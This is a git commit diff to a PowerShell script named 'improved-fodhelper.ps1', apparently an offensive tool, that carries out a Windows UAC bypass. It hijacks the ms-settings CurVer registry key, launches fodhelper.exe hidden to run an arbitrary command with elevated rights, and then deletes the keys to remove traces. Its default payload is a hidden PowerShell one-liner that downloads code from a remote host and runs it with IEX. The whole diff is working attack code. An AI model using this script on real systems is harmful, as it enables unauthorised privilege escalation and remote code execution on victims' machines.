d9574e0966eb51a1d0380ac59aeebd55e9f0a546
hkrsanjeet <43851687+hkrsanjeet@users.noreply.github.com>
2026-05-19 15:54:47 +0530

    Update improved-fodhelper.ps1

--- Fodhelper/improved-fodhelper.ps1
+++ Fodhelper/improved-fodhelper.ps1
@@ -1,16 +1,21 @@
-function Bypass { 
+function invoke-fodhelper { 
     Param (    
-        [String]$program = "IEX(New-Object Net.webclient).downloadString('http://[ATTACKER_IP]/run.txt')"
+        [String]$program = 'Powershell -WindowStyle Hidden iex (new-object net.webclient).downloadstring(''http://192.168.1.1/payload.txt'')'
+             
+        
+         
     )
+    
+    
+    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value "" -Force
 
     New-Item "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Force
     Set-ItemProperty "HKCU:\Software\Classes\.sanjeet\Shell\Open\command" -Name "(default)" -Value $program -Force
-    
-    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+
     Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".sanjeet" -Force
-    
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-    
+
     Start-Sleep 3
     
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
